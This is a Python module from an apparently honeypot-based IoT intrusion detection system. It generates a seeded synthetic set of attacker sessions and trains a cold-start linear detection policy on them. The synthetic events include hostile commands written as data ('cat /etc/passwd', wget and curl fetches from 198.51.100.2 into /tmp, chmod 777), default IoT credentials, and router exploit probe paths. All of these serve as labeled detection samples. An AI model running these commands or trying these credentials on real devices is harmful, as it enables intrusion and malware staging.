"""Deterministic cold-start policy from a synthetic, fully-labeled training set.

Before any experiments have run there is no logged data, so this module builds a
reproducible synthetic set (fixed RNG seed) -- clean per-head archetypes plus
plenty of low-everything negatives -- and trains the *same* :func:`train`
function on it. Because the data is synthetic and fully controlled, every example
carries a complete 0/1 label on every head (the ground truth is known by
construction), unlike real logged data which usually knows only one head per
experiment. Labels are derived from the *extracted* features of each synthetic
session (see :func:`_labels`), so there is no skew between what the model trains
on and how it later scores live sessions.

The archetypes are deliberately decorrelated -- each varies one feature family
over a clearly-positive and a clearly-negative band while holding the others low
-- so every head learns its own feature instead of borrowing correlations from
another. The label semantics reuse the historical rule thresholds on purpose:
the rework makes those thresholds *learned weights* that batch retraining can
move, not something that behaves differently on day one.

The resulting :class:`LinearPolicy` is what the system uses until a real
``trapsig-policy`` generation exists, and it is also the warm-start priors that
batch retraining builds on.
"""

import random
from functools import lru_cache

from .features import FEATURE_SCHEMA_VERSION, feature_vector, raw_feature_map
from .policy import LinearPolicy
from .training import TrainingExample, train

BOOTSTRAP_SEED = 20260101
BOOTSTRAP_POLICY_VERSION = f"bootstrap-fs{FEATURE_SCHEMA_VERSION}-s{BOOTSTRAP_SEED}"

DETECTION_TYPES = (
    "RECONNAISSANCE",
    "BRUTE_FORCE",
    "DEFAULT_CREDENTIALS",
    "WEB_ENUMERATION",
    "COMMAND_INTERACTION",
    "MQTT_PROBING",
    "MULTI_SERVICE_ACTIVITY",
    "MULTI_STAGE_ATTACK",
    "EXPLOIT_ATTEMPT",
    "MALWARE_DOWNLOAD",
    "UNAUTHORIZED_COMMAND",
    "ICS_RECONNAISSANCE",
    "ICS_WRITE",
)

_NON_WEAK_CREDENTIALS = (
    ("operator", "S3cured-Pa55!"),
    ("svc-backup", "r0tated-key-9f2"),
    ("deploy", "N0tADefault_22"),
)
_WEAK_CREDENTIALS = (
    ("admin", "admin"),
    ("root", "root"),
    ("pi", "raspberry"),
    ("root", "xc3511"),
    ("admin", "1234"),
)
_BENIGN_SERVICES = ("camera", "router", "iot-service", "mqtt", "cowrie")
_URL_POOL = ("/", "/login", "/admin", "/config", "/status", "/setup", "/network", "/system", "/firmware", "/device")
_COMMAND_POOL = ("id", "uname -a", "cat /etc/passwd", "wget http://x/y", "busybox", "ps aux")


def _event(index, *, service, protocol, category="network", outcome="unknown", auth=None, url=None, command=None, mqtt=None, extra=None):
    event: dict = {
        "event": {"id": f"boot-{index}", "category": category, "outcome": outcome},
        "network": {"protocol": protocol},
        "service": {"name": service},
    }
    if auth is not None:
        event["authentication"] = {"username": auth[0], "password": auth[1]}
    if url is not None:
        event["url"] = {"path": url}
    if command is not None:
        event["process"] = {"command_line": command}
    if mqtt is not None:
        event["mqtt"] = mqtt
    if extra:
        event.update(extra)
    return event


def _build_session(
    rng,
    *,
    auth_fail=0,
    auth_ok=0,
    weak=0,
    urls=0,
    commands=0,
    mqtt_count=0,
    mqtt_active=False,
    iot_probes=0,
    benign_services=(),
    benign_volume=1,
    duration=0,
    ics_writes=0,
    ics_identify=0,
    ics_reads=0,
    control=0,
    exploits=0,
    downloads=0,
    uploads=0,
    streams=0,
    discovery=0,
):
    """Assemble a synthetic session dict (with events) from component quantities."""
    events: list[dict] = []
    idx = 0
    remaining_weak = weak

    for _ in range(auth_fail):
        pair = rng.choice(_WEAK_CREDENTIALS) if remaining_weak > 0 else rng.choice(_NON_WEAK_CREDENTIALS)
        remaining_weak -= 1
        events.append(_event(idx, service="cowrie", protocol="ssh", category="authentication", outcome="failure", auth=pair))
        idx += 1
    for _ in range(auth_ok):
        pair = rng.choice(_WEAK_CREDENTIALS) if remaining_weak > 0 else rng.choice(_NON_WEAK_CREDENTIALS)
        remaining_weak -= 1
        events.append(_event(idx, service="cowrie", protocol="ssh", category="authentication", outcome="success", auth=pair))
        idx += 1
    while remaining_weak > 0:
        events.append(_event(idx, service="camera", protocol="http", category="authentication", outcome="failure", auth=rng.choice(_WEAK_CREDENTIALS)))
        remaining_weak -= 1
        idx += 1

    for url in rng.sample(_URL_POOL, min(urls, len(_URL_POOL))):
        events.append(_event(idx, service="camera", protocol="http", category="web", url=url))
        idx += 1

    for command in rng.sample(_COMMAND_POOL, min(commands, len(_COMMAND_POOL))):
        events.append(_event(idx, service="cowrie", protocol="ssh", category="process", command=command))
        idx += 1

    for n in range(mqtt_count):
        operation = rng.choice(("subscribe", "publish", "ping")) if (mqtt_active and n > 0) else "connect"
        events.append(_event(idx, service="mqtt", protocol="mqtt", mqtt={"operation": operation}))
        idx += 1

    for _ in range(iot_probes):
        events.append(_event(idx, service="iot-service", protocol="tcp"))
        idx += 1

    # Benign touches used purely to vary the distinct-service count. benign_volume
    # repeats each so that service spread appears at a range of event volumes,
    # keeping the multi-service head from treating event_count as an anti-signal.
    for service in benign_services:
        protocol = "mqtt" if service == "mqtt" else "tcp" if service == "iot-service" else "http" if service in ("camera", "router") else "ssh"
        for _ in range(benign_volume):
            events.append(_event(idx, service=service, protocol=protocol))
            idx += 1

    ics = ("modbus", "s7", "bacnet")
    for n in range(ics_writes):
        name = rng.choice(ics)
        events.append(_event(idx, service=name, protocol=name, extra={name: {"write": True, "function_code": 6, "address": n}}))
        idx += 1
    for _ in range(ics_identify):
        events.append(_event(idx, service="modbus", protocol="modbus", extra={"modbus": {"function_code": 43}}))
        idx += 1
    for n in range(ics_reads):
        name = rng.choice(ics)
        events.append(_event(idx, service=name, protocol=name, extra={name: {"function_code": 3, "address": n * 10}}))
        idx += 1
    for n in range(control):
        if n % 2:
            events.append(_event(idx, service="mqtt", protocol="mqtt", mqtt={"operation": "publish", "topic": "devices/x/set"}))
        else:
            events.append(_event(idx, service="coap", protocol="coap", extra={"coap": {"method": "PUT", "state_change": True, "uri_path": "/actuators/a"}}))
        idx += 1
    for _ in range(exploits):
        events.append(
            _event(idx, service="router", protocol="http", category="web", url=rng.choice(("/HNAP1/", "/GponForm/diag_Form", "/cgi-bin/luci", "/.env")))
        )
        idx += 1
    for _ in range(downloads):
        events.append(
            _event(
                idx,
                service="cowrie",
                protocol="ssh",
                category="process",
                command=rng.choice(("cd /tmp; wget http://198.51.100.2/x", "curl -O http://198.51.100.2/y", "chmod 777 /tmp/.x")),
            )
        )
        idx += 1
    for _ in range(uploads):
        events.append(_event(idx, service="ftp", protocol="ftp", extra={"ftp": {"command": "STOR", "argument": "x.bin"}}))
        idx += 1
    for n in range(streams):
        events.append(_event(idx, service="rtsp", protocol="rtsp", extra={"rtsp": {"method": "DESCRIBE", "path": f"/stream{n}"}}))
        idx += 1
    for _ in range(discovery):
        events.append(_event(idx, service="coap", protocol="coap", extra={"coap": {"method": "GET", "uri_path": "/.well-known/core"}}))
        idx += 1

    return {"events": events, "duration": float(duration)}


def _labels(session: dict) -> dict[str, int]:
    """Ground-truth labels from the session's *extracted* features (no train/serve skew)."""
    f = raw_feature_map(session)
    has_followup = f["distinct_urls"] >= 1 or f["command_count"] >= 1
    return {
        "BRUTE_FORCE": int(f["auth_failures"] >= 5),
        "DEFAULT_CREDENTIALS": int(f["weak_credential_hits"] >= 1),
        "WEB_ENUMERATION": int(f["distinct_urls"] >= 4),
        "COMMAND_INTERACTION": int(f["command_count"] >= 1),
        "MQTT_PROBING": int(f["mqtt_event_count"] >= 2 or f["mqtt_active_operation"] >= 1),
        "RECONNAISSANCE": int(f["iot_probe_count"] >= 3),
        "MULTI_SERVICE_ACTIVITY": int(f["distinct_services"] >= 3),
        "MULTI_STAGE_ATTACK": int(f["auth_failures"] >= 1 and has_followup and f["distinct_services"] >= 2),
        "EXPLOIT_ATTEMPT": int(f["exploit_path_hits"] >= 1),
        "MALWARE_DOWNLOAD": int(f["download_command_hits"] >= 1),
        "UNAUTHORIZED_COMMAND": int(f["control_message_count"] >= 1),
        "ICS_RECONNAISSANCE": int(f["ics_identify_count"] >= 1 or f["ics_read_targets"] >= 5),
        "ICS_WRITE": int(f["ics_write_count"] >= 1),
    }


def _example(rng, **quantities) -> TrainingExample:
    session = _build_session(rng, **quantities)
    return TrainingExample(vector=feature_vector(session), labels=_labels(session), source="bootstrap")


def _pick(rng, options):
    return rng.choice(options)


def build_training_examples(seed: int = BOOTSTRAP_SEED, repeats: int = 26) -> list[TrainingExample]:
    """Deterministically generate the synthetic, fully-labeled bootstrap set."""
    rng = random.Random(seed)
    examples: list[TrainingExample] = []

    for _ in range(repeats):
        # Pure negatives: low everything, one or two services.
        examples.append(_example(rng, auth_fail=rng.randint(0, 2), urls=rng.randint(0, 2), mqtt_count=rng.randint(0, 1), iot_probes=rng.randint(0, 2)))
        examples.append(_example(rng, duration=rng.randint(0, 120)))

        # BRUTE_FORCE: vary auth_fail, single service, nothing else.
        examples.append(_example(rng, auth_fail=_pick(rng, (5, 8, 12, 20, 30)), weak=0))
        examples.append(_example(rng, auth_fail=_pick(rng, (0, 1, 2, 3)), weak=0))

        # DEFAULT_CREDENTIALS: a weak pair present (pos) vs non-weak auth (neg),
        # across failed logins, a single success login, and HTTP-only auth so the
        # head keys on the weak-credential feature rather than on failure volume.
        examples.append(_example(rng, auth_fail=rng.randint(1, 3), weak=_pick(rng, (1, 2))))
        examples.append(_example(rng, auth_ok=1, weak=1, urls=rng.randint(0, 1)))
        examples.append(_example(rng, auth_fail=rng.randint(1, 3), weak=0))
        examples.append(_example(rng, auth_ok=1, weak=0))

        # WEB_ENUMERATION: distinct URLs, single camera service.
        examples.append(_example(rng, urls=_pick(rng, (4, 6, 9))))
        examples.append(_example(rng, urls=_pick(rng, (0, 1, 2))))

        # COMMAND_INTERACTION: commands present vs none.
        examples.append(_example(rng, commands=_pick(rng, (1, 2, 4))))
        examples.append(_example(rng, commands=0, auth_fail=rng.randint(0, 2)))

        # MQTT_PROBING: >=2 ops or an active op (pos) vs single connect (neg).
        examples.append(_example(rng, mqtt_count=_pick(rng, (2, 3, 5))))
        examples.append(_example(rng, mqtt_count=1, mqtt_active=True))
        examples.append(_example(rng, mqtt_count=1, mqtt_active=False))

        # RECONNAISSANCE: repeated IoT probes vs few.
        examples.append(_example(rng, iot_probes=_pick(rng, (3, 5, 9))))
        examples.append(_example(rng, iot_probes=_pick(rng, (0, 1, 2))))

        # MULTI_SERVICE_ACTIVITY: vary distinct services across a range of
        # per-service volumes so the head keys on service spread, not event count.
        services = list(_BENIGN_SERVICES)
        rng.shuffle(services)
        examples.append(_example(rng, benign_services=tuple(services[: _pick(rng, (3, 4, 5))]), benign_volume=_pick(rng, (1, 2, 4))))
        examples.append(_example(rng, benign_services=tuple(services[: _pick(rng, (1, 2))]), benign_volume=_pick(rng, (1, 3, 6))))

        # MULTI_STAGE_ATTACK: failed auth + follow-up interaction across >=2 services (pos).
        examples.append(_example(rng, auth_fail=rng.randint(2, 6), urls=_pick(rng, (1, 2, 4)), benign_services=("router",)))
        examples.append(_example(rng, auth_fail=rng.randint(2, 6), commands=_pick(rng, (1, 2)), benign_services=("router",)))
        # ... and its hard negatives: only one of the three conditions holds.
        examples.append(_example(rng, auth_fail=rng.randint(2, 6)))  # no follow-up, single service
        examples.append(_example(rng, urls=_pick(rng, (1, 2)), benign_services=("router",)))  # follow-up but no auth fail

        # Schema-2 heads: each varies one feature family positive vs negative.
        examples.append(_example(rng, ics_writes=_pick(rng, (1, 2, 4))))
        examples.append(_example(rng, ics_reads=_pick(rng, (1, 2, 3))))
        examples.append(_example(rng, ics_identify=_pick(rng, (1, 2))))
        examples.append(_example(rng, ics_reads=_pick(rng, (5, 8, 12))))
        examples.append(_example(rng, control=_pick(rng, (1, 2, 4))))
        examples.append(_example(rng, mqtt_count=_pick(rng, (1, 2)), mqtt_active=False))
        examples.append(_example(rng, exploits=_pick(rng, (1, 3, 6))))
        examples.append(_example(rng, urls=_pick(rng, (1, 3, 6))))
        examples.append(_example(rng, downloads=_pick(rng, (1, 2))))
        examples.append(_example(rng, uploads=1))
        examples.append(_example(rng, commands=_pick(rng, (1, 3))))  # commands without staging are negatives
        examples.append(_example(rng, streams=_pick(rng, (1, 2, 6)), discovery=_pick(rng, (0, 1, 3))))

        # Combined sessions with several feature families independently high or
        # low, labeled from their extracted features. These break cross-feature
        # leakage: a head cannot use another head's feature as a shortcut because
        # every combination of (its feature, the others) appears with the correct
        # per-head label.
        extra = list(_BENIGN_SERVICES)
        rng.shuffle(extra)
        examples.append(
            _example(
                rng,
                auth_fail=_pick(rng, (0, 1, 2, 6, 12)),
                weak=_pick(rng, (0, 0, 1, 2)),
                urls=_pick(rng, (0, 1, 5, 8)),
                commands=_pick(rng, (0, 0, 1, 3)),
                mqtt_count=_pick(rng, (0, 1, 3)),
                mqtt_active=rng.random() < 0.3,
                iot_probes=_pick(rng, (0, 1, 4, 7)),
                benign_services=tuple(extra[: _pick(rng, (0, 1, 2, 3))]),
                duration=rng.randint(0, 600),
                ics_writes=_pick(rng, (0, 0, 0, 1)),
                ics_reads=_pick(rng, (0, 2, 6)),
                ics_identify=_pick(rng, (0, 0, 1)),
                control=_pick(rng, (0, 0, 1)),
                exploits=_pick(rng, (0, 0, 1)),
                downloads=_pick(rng, (0, 0, 1)),
                streams=_pick(rng, (0, 2)),
            )
        )

    return examples


@lru_cache(maxsize=1)
def bootstrap_policy() -> LinearPolicy:
    """Train (once, cached) and return the deterministic cold-start policy."""
    examples = build_training_examples()
    return train(
        examples,
        DETECTION_TYPES,
        epochs=800,
        learning_rate=0.6,
        l2=0.00002,
        policy_version=BOOTSTRAP_POLICY_VERSION,
    )
